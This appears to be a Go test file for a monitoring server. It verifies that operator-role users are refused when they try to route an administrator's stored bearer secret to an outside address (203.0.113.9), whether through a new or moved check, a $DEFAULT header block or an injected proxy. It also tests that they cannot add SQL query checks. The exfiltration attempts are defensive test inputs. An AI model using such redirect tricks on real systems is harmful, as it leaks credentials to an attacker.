package server

import (
	"strings"
	"testing"
)

// An operator cannot point a check at a server of their own with a
// secret in it, nor move an administrator's check that uses one; they
// can still pause and delete it.
func TestOperatorCannotUseSecrets(t *testing.T) {
	admin := newEnv(t, testBind, nil)
	admin.setup()
	if c := admin.do("PUT", "/api/v1/secrets/token", map[string]string{"value": "s3cr3t-value"}, nil); c != 204 {
		t.Fatalf("secret: %d", c)
	}
	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator"}, nil); c != 200 {
		t.Fatalf("user: %d", c)
	}
	mon := func(name, url string) map[string]any {
		return map[string]any{"record": map[string]any{"name": name, "type": "HTTP", "target": url,
			"opts": map[string]string{"header.Authorization": "Bearer ${secret:token}"}}}
	}
	if c := admin.do("POST", "/api/v1/monitors", mon("api", "http://192.168.1.50/health"), nil); c != 200 {
		t.Fatalf("admin add: %d", c)
	}
	op := admin.loginAs("op", "secret123")
	if c := op.do("POST", "/api/v1/monitors", mon("steal", "http://203.0.113.9/"), nil); c != 403 {
		t.Fatalf("operator added a check that sends a secret: %d", c)
	}
	if c := op.do("PUT", "/api/v1/monitors/api", mon("api", "http://203.0.113.9/"), nil); c != 403 {
		t.Fatalf("operator moved a check that sends a secret: %d", c)
	}
	if c := op.do("POST", "/api/v1/monitors/api/pause", map[string]any{"paused": true}, nil); c != 200 {
		t.Fatalf("operator pause: %d", c)
	}
	// Other checks stay theirs to add.
	if c := op.do("POST", "/api/v1/monitors", map[string]any{"record": map[string]any{"name": "plain", "type": "HTTP", "target": "http://192.168.1.51/"}}, nil); c != 200 {
		t.Fatalf("operator plain add: %d", c)
	}
	if c := op.do("DELETE", "/api/v1/monitors/api", nil, nil); c != 200 && c != 204 {
		t.Fatalf("operator delete: %d", c)
	}
}

// A check that runs an SQL query acts with the administrator's database
// account: operators cannot add one.
func TestOperatorCannotAddQueries(t *testing.T) {
	admin := newEnv(t, testBind, nil)
	admin.setup()
	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator"}, nil); c != 200 {
		t.Fatalf("user: %d", c)
	}
	op := admin.loginAs("op", "secret123")
	rec := map[string]any{"record": map[string]any{"name": "dbq", "type": "POSTGRES", "target": "192.168.1.30:5432",
		"opts": map[string]string{"user": "mon", "password": "plainpassword", "query": "SELECT count(*) FROM jobs"}}}
	if c := op.do("POST", "/api/v1/monitors", rec, nil); c != 403 {
		t.Fatalf("operator added a query check: %d", c)
	}
	if c := admin.do("POST", "/api/v1/monitors", rec, nil); c != 200 {
		t.Fatalf("administrator: %d", c)
	}
}

// A $DEFAULT gives the monitors under it its options: an operator cannot
// get a secret sent by writing it there instead of on the record, nor
// redirect an administrator's check through a $DEFAULT above it.
func TestOperatorCannotUseSecretsThroughDefault(t *testing.T) {
	admin := newEnv(t, testBind, nil)
	admin.setup()
	if c := admin.do("PUT", "/api/v1/secrets/token", map[string]string{"value": "s3cr3t-value"}, nil); c != 204 {
		t.Fatalf("secret: %d", c)
	}
	if c := admin.do("POST", "/api/v1/users", map[string]any{"username": "op", "password": "secret123", "role": "operator"}, nil); c != 200 {
		t.Fatalf("user: %d", c)
	}
	op := admin.loginAs("op", "secret123")
	var cfg struct{ Text string }
	op.do("GET", "/api/v1/config", nil, &cfg)
	steal := cfg.Text + "$DEFAULT header.Authorization=\"Bearer ${secret:token}\"\nsteal IN HTTP http://203.0.113.9/\n$DEFAULT\n"
	if c := op.do("PUT", "/api/v1/config", map[string]any{"text": steal}, nil); c != 403 {
		t.Fatalf("operator sent a secret through $DEFAULT: %d", c)
	}
	// The administrator's check under such a $DEFAULT …
	withDef := cfg.Text + "$DEFAULT header.Authorization=\"Bearer ${secret:token}\"\napi IN HTTP http://192.168.1.50/health\n$DEFAULT\n"
	if c := admin.do("PUT", "/api/v1/config", map[string]any{"text": withDef}, nil); c != 200 {
		t.Fatalf("admin: %d", c)
	}
	op.do("GET", "/api/v1/config", nil, &cfg)
	// … cannot be sent elsewhere by a $DEFAULT the operator adds above it.
	moved := strings.Replace(cfg.Text, "$DEFAULT header.Authorization=", "$DEFAULT proxy=http://203.0.113.9:3128 header.Authorization=", 1)
	if moved == cfg.Text {
		t.Fatal("test text not changed")
	}
	if c := op.do("PUT", "/api/v1/config", map[string]any{"text": moved}, nil); c != 403 {
		t.Fatalf("operator redirected a check through $DEFAULT: %d", c)
	}
	// Unrelated changes stay the operator's.
	if c := op.do("PUT", "/api/v1/config", map[string]any{"text": cfg.Text + "plain IN HTTP http://192.168.1.51/\n"}, nil); c != 200 {
		t.Fatalf("operator plain add: %d", c)
	}
}
